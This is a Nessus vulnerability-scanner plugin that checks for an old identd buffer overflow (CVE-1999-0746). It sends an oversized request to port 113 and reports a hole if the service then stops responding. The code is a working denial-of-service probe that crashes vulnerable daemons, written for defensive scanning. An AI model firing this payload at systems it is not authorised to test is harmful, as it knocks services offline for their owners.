#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
##############
# References:
##############
#
# Date: Sun, 15 Sep 2002 04:04:09 +0000
# From: "Lance Fitz-Herbert" <fitzies@HOTMAIL.COM>
# Subject: Trillian .74 and below, ident flaw.
# To: NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
#

if(description)
{
 script_id(10560);
 script_bugtraq_id(587);
script_cve_id("CVE-1999-0746");
 script_version ("$Revision: 1.11 $");

 
 name["english"] = "SuSE's identd overflow";
 name["francais"] = "Buffer overflow dans le identd de SuSE";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
Ident is a protocol which gives to the remote server
the name of the user who initiated a given connection.
It's mainly used by IRC, SMTP and POP servers to obtain
the login name of the person who is using their services.

There is a flaw in the remote identd daemon which allows anyone
to crash this service remotely.

Solution : disable this service if you do not use it, or upgrade
Risk factor : Low";

 desc["francais"] = "
Ident est un protocole qui permet à un serveur donné d'obtenir
le nom de l'utilisateur qui a établit une connection avec lui.
Il est principalement utilisé par les serveur d'IRC, SMTP et POP
pour enregistrer le nom de login de la personne qui utilise leurs
services.

Il y a un bug dans le service identd distant qui permet à n'importe
qui de faire planter ce service à distance.

Solution : désactivez ce service si vous ne l'utilisez pas, ou bien
mettez votre daemon à jour
Facteur de risque : Faible";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "crashes the remote identd";
 summary["francais"] = "plantes le identd distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service1.nasl");
 script_require_ports("Services/auth", 113);
 exit(0);
}

#
# The script code starts here
#

port = get_kb_item("Services/auth");
if(!port) port = 113;
if(!get_port_state(port))exit(0);


soc = open_sock_tcp(port);
if(soc)
{
 req = string(crap(4096), ",", crap(4096), "\r\n");
 send(socket:soc, data:req);
 sleep(2);
 close(soc);

 soc = open_sock_tcp(port);
 if(!soc)security_hole(port);
}
